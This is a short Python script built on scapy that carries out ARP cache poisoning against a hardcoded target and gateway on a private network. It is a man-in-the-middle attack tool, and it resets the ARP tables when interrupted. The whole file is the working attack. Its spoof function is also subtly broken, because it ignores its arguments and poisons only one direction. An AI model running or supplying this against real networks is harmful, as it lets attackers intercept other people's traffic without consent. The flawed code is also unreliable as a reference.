#!/usr/bin/env python3#
import time
import scapy.all as scapy



def get_mac(ip):
 arp_request = scapy.ARP(pdst=ip)
 broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 arp_request_broadcast = broadcast / arp_request
 answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
 target_ip = get_mac(target_ip)
 packet = scapy.ARP(op=2, pdst="192.168.13.131", psrc="192.168.13.2")
 scapy.send(packet, verbose=False)

 
 
def restore(dest_ip, source_ip):
 dest_mac = get_mac(dest_ip)
 source_mac = get_mac(source_ip)
 packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
 scapy.send(packet, count=4, verbose=False)
 
 

target_ip = "192.168.13.131"
gateway_ip = "192.168.13.2"
try:
 count = 0
 while True:
  spoof(target_ip, gateway_ip)
  spoof(gateway_ip, target_ip)
  time.sleep(2)
  count = count + 2
  print("\r[+] Packets sent: " + str(count), end="") 

except KeyboardInterrupt:
 print("[+] Detected ctrl+c ... Resetting ARP table ... ")
 restore(target_ip, gateway_ip)
 restore(gateway_ip, target_ip)
